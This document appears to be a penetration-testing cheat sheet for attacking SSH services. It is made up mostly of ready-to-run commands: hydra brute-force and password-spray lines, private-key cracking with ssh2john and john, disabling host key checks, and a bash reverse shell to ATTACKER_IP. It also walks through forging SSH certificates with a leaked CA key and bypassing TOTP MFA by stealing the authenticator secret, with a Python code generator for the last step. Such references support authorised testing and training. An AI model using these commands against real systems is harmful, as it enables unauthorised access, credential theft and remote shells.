# Secure Shell (SSH)

## Port: 22

### 1) Authenticate via SSH

    ssh USER@IP

### 2) Authenticate using private key

Give appropriate permissions for the key

    chmod 600 id_rsa

Authenticate

    ssh USER@IP -i id_rsa

### 3) Brute force credentials

Brute force

    hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -t 4 ssh

Password Spray

    hydra -L USERLIST -p password IP -t 4 ssh

Default credentials

    hydra -f -V -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt IP ssh

### 4) Convert PuTTY key to OpenSSH format

    puttygen PUTTY_KEY -O private-openssh -o OUTPUT_KEY

### 5) Crack SSH Private keys

    ssh2john id_rsa > hash.txt

    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

### 6) Run commands upon connection

    ssh USER@IP "whoami"

### 7) Bypass Host Key Checking

    ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no USER@IP

### 8) Force a different cipher

    ssh -c aes128-cbc USER@IP

### 9) Force an older SSH version

    ssh -1 USER@IP

### 10) Reverse shell with weak cryptographic algorithms

    ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa USER@IP -t 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'

## SSH Private CA Key Compromise

### 1) Locate the leaked CA key

This scenario depends on use case, there is no fixed way. Example could be a public GitHub repo or an insecure directory indexing on a web application.

### 2) Generate an attacker keypair

    ssh-keygen -t ed25519 -f attacker_key -N ""

### 3) Sign a forged certificate

    ssh-keygen -s <ca-key> -I <identity> -n <principal> -V <validity> <user-public-key>

### 4) Confirm what you signed

    ssh-keygen -L -f attacker_key-cert.pub

### 5) Connect with the forged certificate

    ssh -o StrictHostKeyChecking=no -i attacker_key -o CertificateFile=attacker_key-cert.pub PRINCIPAL@TARGET_HOST

## TOTP-Based MFA Bypass

### 1) Search for the secret (example Google Authenticator)

    find / -iname .google_authenticator 2>/dev/null

### 2) Print contents if found

First line is the base32 secret

    cat /opt/backups/mfa/.google_authenticator

### 3) Decode secret

Oauthtool

    oauthtool --totp -b BASE32_SECRET

Python

    import base64, hmac, hashlib, struct, sys, time
    
    def totp(secret, digits=6, period=30, algo=hashlib.sha1, t=None):
        key = secret.replace(" ", "").upper()
        key = base64.b32decode(key + "=" * (-len(key) % 8))           # fix missing padding
        counter = int((time.time() if t is None else t) // period)    # RFC 6238 time step
        mac = hmac.new(key, struct.pack(">Q", counter), algo).digest()  # RFC 4226 HOTP
        off = mac[-1] & 0x0F                                          # dynamic truncation
        code = (struct.unpack(">I", mac[off:off + 4])[0] & 0x7FFFFFFF) % 10**digits
        return str(code).zfill(digits)
    
    if __name__ == "__main__":
        print(totp(sys.argv[1]))

Run as

    python3 totp.py BASE32_SECRET

### 4) Connect to target

    ssh USER@TARGET_HOST
